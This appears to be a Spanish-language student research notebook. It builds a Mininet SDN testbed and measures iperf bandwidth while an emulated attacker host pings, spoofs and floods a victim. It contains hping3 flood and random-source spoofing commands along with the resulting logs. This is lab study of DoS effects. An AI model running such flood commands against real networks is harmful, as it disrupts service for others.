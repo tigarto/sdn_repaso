{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Perfilamiento de trafico de test"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Resumen"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "En el siguiente informe se resaltan las actividades prepuestas en la reunión del dia 23/11/2108 [The effects of DoS attacks on ODL and POX SDN controllers](https://ieeexplore.ieee.org/document/8080058) y las conclusiones al respecto."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Actividades realizadas "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 1. Codificación del banco de pruebas en mininet "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "En el archivo [test_experiment_beta1.py](./test_experiment_beta1.py) automatiza (en teoria los resultados). Por comodidad se muestra este codigo a continuación:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "import sys\n",
    "\n",
    "from mininet.topo import Topo\n",
    "from mininet.net import Mininet\n",
    "from mininet.util import irange,dumpNodeConnections\n",
    "from mininet.log import setLogLevel, info\n",
    "from mininet.link import TCLink\n",
    "\n",
    "from time import time\n",
    "from select import poll, POLLIN\n",
    "from subprocess import Popen, PIPE\n",
    "from time import sleep\n",
    "\n",
    "\n",
    "class TopoTest(Topo):\n",
    "   \"Linear topology of k switches, with one host per switch.\"\n",
    "\n",
    "   def __init__(self, nSwitch = 2, nHosts = 4, **opts):\n",
    "       \"\"\"Init.\n",
    "           nSwitch: number of switches\n",
    "           nHosts: numero de hosts\n",
    "           hconf: host configuration options\n",
    "           lconf: link configuration options\n",
    "        \"\"\"\n",
    "\n",
    "       super(TopoTest, self).__init__(**opts)\n",
    "\n",
    "       self.nSwitch = nSwitch\n",
    "       self.nHosts = nHosts\n",
    "       h = 0 #nHosts - 1\n",
    "       lastSwitch = None\n",
    "       for i in irange(1, nSwitch):\n",
    "           switch = self.addSwitch('s%s' % i)\n",
    "           for j in irange(h + 1, h + nHosts):\n",
    "               # bw = 10 Mbps\n",
    "               host = self.addHost('h%s' % j)\n",
    "               self.addLink(switch, host, bw = 10)\n",
    "           if lastSwitch:\n",
    "               # bw = 10 Mbps\n",
    "               self.addLink(switch, lastSwitch, bw = 1000)\n",
    "           lastSwitch = switch\n",
    "           h += nHosts\n",
    "\n",
    "def test_ping():\n",
    "    topo = TopoTest()\n",
    "    net = Mininet(topo=topo, link=TCLink)\n",
    "    net.start()\n",
    "    net.pingAll()\n",
    "    net.stop()\n",
    "\n",
    "def testBW(test_time, experimento):\n",
    "    topo = TopoTest()\n",
    "    net = Mininet(topo=topo, link=TCLink)\n",
    "    net.start()\n",
    "    hosts_iperf = [net.get(experimento['iperf_src']), net.get(experimento['iperf_dst'])]\n",
    "    outfile = \"iperf_\" + \\\n",
    "              experimento['iperf_src'] + \\\n",
    "              \"-\" + \\\n",
    "              experimento['iperf_dst'] + \\\n",
    "              \".log\"\n",
    "\n",
    "    hosts_iperf[1].cmd('echo >', outfile)\n",
    "    # Iperf server (Se redirecciona solo la salida)\n",
    "    hosts_iperf[1].cmdPrint('iperf', '-s', '-i', '1',\n",
    "                            '>', outfile,\n",
    "                            '&')\n",
    "    hosts_iperf[0].cmdPrint('iperf', '-c', str(hosts_iperf[1].IP()), '-t ' + str(test_time) + \" &\")\n",
    "    sleep(test_time)\n",
    "    net.pingAll()\n",
    "    net.stop()\n",
    "\n",
    "\n",
    "def testBW_ataque(test_time, experimento):\n",
    "    topo = TopoTest()\n",
    "    net = Mininet(topo=topo, link=TCLink)\n",
    "    net.start()\n",
    "    hosts_iperf = [net.get(experimento['iperf_src']), net.get(experimento['iperf_dst'])]\n",
    "    a_list = experimento['atacantes'].split(\"-\")\n",
    "    atacantes = []\n",
    "    victima = net.get(experimento['victima'])\n",
    "    for a in a_list:\n",
    "        atacantes.append(net.get(a))\n",
    "\n",
    "    # Archivo de salida para el iperf\n",
    "    outfile = \"iperf_\" + \\\n",
    "              experimento['iperf_src'] + \\\n",
    "              \"-\" + \\\n",
    "              experimento['iperf_dst'] + \\\n",
    "              \".log\"\n",
    "\n",
    "    # Redireccion para vaciar el archivo\n",
    "\n",
    "    hosts_iperf[1].cmd('echo >', outfile)\n",
    "\n",
    "\n",
    "    # Iperf server (Se redirecciona solo la salida)\n",
    "    hosts_iperf[1].cmdPrint('iperf', '-s', '-i', '1',\n",
    "                            '>', outfile,\n",
    "                            '&')\n",
    "\n",
    "    # Iperf_client\n",
    "    hosts_iperf[0].cmdPrint('iperf', '-c', str(hosts_iperf[1].IP()), '-t ' + str(test_time) + \" &\")\n",
    "\n",
    "    # Lanzando el ataque\n",
    "    info(\"*** Lanzado ataques...\")\n",
    "    for a in atacantes:\n",
    "        # a.cmdPrint('hping3 --flood --rand-source', str(victima.IP()), \" &\")\n",
    "        # a.cmdPrint('ping -c 10', str(victima.IP()), \" &\")\n",
    "        # a.cmdPrint('hping3 --flood', str(victima.IP()), \" &\")\n",
    "        a.cmdPrint('hping3 --rand-source', str(victima.IP()), \"&\")\n",
    "\n",
    "    sleep(test_time)\n",
    "    net.stop()\n",
    "\n",
    "\n",
    "if __name__ == '__main__':\n",
    "    print (\"Empezando el ensayo\")\n",
    "    setLogLevel('info')\n",
    "    experimento1 = {'iperf_src': 'h1','iperf_dst': 'h8'}\n",
    "    experimento2 = {'iperf_src': 'h1','iperf_dst': 'h8', 'victima':'h5' , 'atacantes':'h2'}\n",
    "    # test_ping()\n",
    "    #testBW(50, experimento1)\n",
    "    testBW_ataque(20,experimento2)\n",
    "\n",
    "    print (\"Hasta la vista baby\")\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 2. Algunos de analisis previamente realizados"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "A Continuación se exponen algunos de los resultados obtenidos:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "1. **Resultados sin ataque**: Se llama la funcion ```testBW``` mediante el siguiente experimento:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "...\n",
    "experimento1 = {'iperf_src': 'h1','iperf_dst': 'h8'}\n",
    "testBW(50, experimento1)\n",
    "...\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "El resultado sin el ataque es un archivo de [texto](iperf_h1-h8_no_attack.log) con un contenido como el siguiente:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    "------------------------------------------------------------\n",
    "Server listening on TCP port 5001\n",
    "TCP window size: 85.3 KByte (default)\n",
    "------------------------------------------------------------\n",
    "[  4] local 10.0.0.8 port 5001 connected with 10.0.0.1 port 59002\n",
    "[ ID] Interval       Transfer     Bandwidth\n",
    "[  4]  0.0- 1.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "[  4]  1.0- 2.0 sec  1.14 MBytes  9.55 Mbits/sec\n",
    "[  4]  2.0- 3.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "[  4]  3.0- 4.0 sec  1.14 MBytes  9.56 Mbits/sec\n",
    "[  4]  4.0- 5.0 sec  1.14 MBytes  9.55 Mbits/sec\n",
    "[  4]  5.0- 6.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "...\n",
    "[  4] 47.0-48.0 sec  1.14 MBytes  9.59 Mbits/sec\n",
    "[  4] 48.0-49.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "[  4] 49.0-50.0 sec  1.14 MBytes  9.55 Mbits/sec\n",
    "[  4]  0.0-50.3 sec  57.4 MBytes  9.56 Mbits/sec\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "2. **Resultados empleando un ping**: Se llama la funcion ```testBW_ataque``` mediante el siguiente experimento:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "...\n",
    "experimento2 = {'iperf_src': 'h1','iperf_dst': 'h8', 'victima':'h5' , 'atacantes':'h2'}\n",
    "testBW_ataque(50, experimento2)\n",
    "...\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Para el caso, en la función, se empleo un comando ping en lo que llamamos el atacante, asi:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "def testBW_ataque(test_time, experimento):\n",
    "    ...\n",
    "    a.cmdPrint('ping -c 4', str(victima.IP()), \" &\")\n",
    "    ...\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "El resultado sin el ataque es un archivo de [texto](iperf_h1-h8_ping_h2-h5.log) con un contenido como el siguiente:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    "------------------------------------------------------------\n",
    "Server listening on TCP port 5001\n",
    "TCP window size: 85.3 KByte (default)\n",
    "------------------------------------------------------------\n",
    "[  4] local 10.0.0.8 port 5001 connected with 10.0.0.1 port 59156\n",
    "[ ID] Interval       Transfer     Bandwidth\n",
    "[  4]  0.0- 1.0 sec  1.14 MBytes  9.58 Mbits/sec\n",
    "[  4]  1.0- 2.0 sec  1.14 MBytes  9.53 Mbits/sec\n",
    "[  4]  2.0- 3.0 sec  1.14 MBytes  9.56 Mbits/sec\n",
    "[  4]  3.0- 4.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "[  4]  4.0- 5.0 sec  1.14 MBytes  9.55 Mbits/sec\n",
    "[  4]  5.0- 6.0 sec  1.14 MBytes  9.56 Mbits/sec\n",
    "[  4]  6.0- 7.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "...\n",
    "[  4] 45.0-46.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "[  4] 46.0-47.0 sec  1.14 MBytes  9.56 Mbits/sec\n",
    "[  4] 47.0-48.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "[  4] 48.0-49.0 sec  1.14 MBytes  9.58 Mbits/sec\n",
    "[  4] 49.0-50.0 sec  1.14 MBytes  9.52 Mbits/sec\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Tengase en cuenta, que si se aumentan el numero de pings, es posible que la salida se afecte, por lo menos, vemos que ya de por si, en cuanto a la ultima fila ya hay una varianza (Es posible que para escribir datos en el archivo de salida se necesite mas tiempo)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3. **Resultados empleando un spoofing**: Se llama la funcion ```testBW_ataque``` mediante el siguiente experimento en el cual la idea es falsificar la IP origen:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "experimento2 = {'iperf_src': 'h1','iperf_dst': 'h8', 'victima':'h5' , 'atacantes':'h2'}\n",
    "testBW_ataque(50, experimento2)\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Para el caso, en la función, se empleo un comando ping en lo que llamamos el atacante, asi:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "def testBW_ataque(test_time, experimento):\n",
    "    ...\n",
    "    a.cmdPrint('hping3 --rand-source', str(victima.IP()), \"&\")\n",
    "    ...\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "El resultado sin el ataque es un archivo de [texto](iperf_h1-h8_spoofing.log) con un contenido como el siguiente:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    "------------------------------------------------------------\n",
    "Server listening on TCP port 5001\n",
    "TCP window size: 85.3 KByte (default)\n",
    "------------------------------------------------------------\n",
    "[  4] local 10.0.0.8 port 5001 connected with 10.0.0.1 port 59238\n",
    "[ ID] Interval       Transfer     Bandwidth\n",
    "[  4]  0.0- 1.0 sec  1.14 MBytes  9.60 Mbits/sec\n",
    "[  4]  1.0- 2.0 sec  1.14 MBytes  9.55 Mbits/sec\n",
    "[  4]  2.0- 3.0 sec  1.14 MBytes  9.56 Mbits/sec\n",
    "[  4]  3.0- 4.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "[  4]  4.0- 5.0 sec  1.14 MBytes  9.55 Mbits/sec\n",
    "[  4]  5.0- 6.0 sec  1.14 MBytes  9.56 Mbits/sec\n",
    "[  4]  6.0- 7.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "...\n",
    "[  4] 46.0-47.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "[  4] 47.0-48.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "[  4] 48.0-49.0 sec  1.14 MBytes  9.56 Mbits/sec\n",
    "[  4] 49.0-50.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3. **Resultados empleando flooding**: Se llama la funcion ```testBW_ataque``` mediante el siguiente experimento generando muchos paquetes para inundar la red:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "experimento2 = {'iperf_src': 'h1','iperf_dst': 'h8', 'victima':'h5' , 'atacantes':'h2'}\n",
    "testBW_ataque(50, experimento2)\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Para el caso, en la función, se empleo un comando ping en lo que llamamos el atacante, asi:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "def testBW_ataque(test_time, experimento):\n",
    "    ...\n",
    "    a.cmdPrint('hping3 --flood', str(victima.IP()), \" &\")    \n",
    "    ...\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "El resultado sin el ataque es un archivo de [texto](iperf_h1-h8_flooding.log) con un contenido como el siguiente:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    "------------------------------------------------------------\n",
    "Server listening on TCP port 5001\n",
    "TCP window size: 85.3 KByte (default)\n",
    "------------------------------------------------------------\n",
    "[  4] local 10.0.0.8 port 5001 connected with 10.0.0.1 port 59306\n",
    "[ ID] Interval       Transfer     Bandwidth\n",
    "[  4]  0.0- 1.0 sec  1.14 MBytes  9.58 Mbits/sec\n",
    "[  4]  1.0- 2.0 sec  1.14 MBytes  9.56 Mbits/sec\n",
    "[  4]  2.0- 3.0 sec  1.14 MBytes  9.55 Mbits/sec\n",
    "[  4]  3.0- 4.0 sec  1.14 MBytes  9.55 Mbits/sec\n",
    "[  4]  4.0- 5.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "[  4]  5.0- 6.0 sec  1.14 MBytes  9.56 Mbits/sec\n",
    "[  4]  6.0- 7.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "[  4]  7.0- 8.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "El archivo anterior no tiene mas filas, para el caso dado es como si el ancho de banda se ubiera ido a 0 pues se presume que dejaron de llegar paquetes al servidor. No se que tan relevante sea esto o que sentido tienen estos resultados con la realidad. Si lo anterior sucede, una cosa que si me extraña es la caida tan abrupta del ancho de banda. No se si esto tenga que ver con el intervalo fijado en la medicion pues puede que un segundo sea mucho."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3. **Resultados empleando flooding y spoofing**: Se llama la funcion ```testBW_ataque``` mediante el siguiente experimento generando muchos paquetes para inundar la red:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "experimento2 = {'iperf_src': 'h1','iperf_dst': 'h8', 'victima':'h5' , 'atacantes':'h2'}\n",
    "testBW_ataque(50, experimento2)\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Para el caso, en la función, se empleo un comando ping en lo que llamamos el atacante, asi:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "def testBW_ataque(test_time, experimento):\n",
    "    ...\n",
    "    a.cmdPrint('hping3 --flood --rand-source', str(victima.IP()), \" &\")    \n",
    "    ...\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "El resultado sin el ataque es un archivo de [texto](iperf_h1-h8_spoof_flood.log) con un contenido como el siguiente:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    "------------------------------------------------------------\n",
    "Server listening on TCP port 5001\n",
    "TCP window size: 85.3 KByte (default)\n",
    "------------------------------------------------------------\n",
    "[  4] local 10.0.0.8 port 5001 connected with 10.0.0.1 port 59844\n",
    "[ ID] Interval       Transfer     Bandwidth\n",
    "[  4]  0.0- 1.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "[  4]  1.0- 2.0 sec  1.14 MBytes  9.56 Mbits/sec\n",
    "[  4]  2.0- 3.0 sec  1.14 MBytes  9.56 Mbits/sec\n",
    "[  4]  3.0- 4.0 sec  1.14 MBytes  9.55 Mbits/sec\n",
    "[  4]  4.0- 5.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "[  4]  5.0- 6.0 sec  1.14 MBytes  9.56 Mbits/sec\n",
    "[  4]  6.0- 7.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "[  4]  7.0- 8.0 sec  1.14 MBytes  9.57 Mbits/sec\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Solo resta decir que la salida es muy similar al caso de flooding"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Conclusiones "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "1. Oh! y ahora quien podra ayudarme."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.4.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
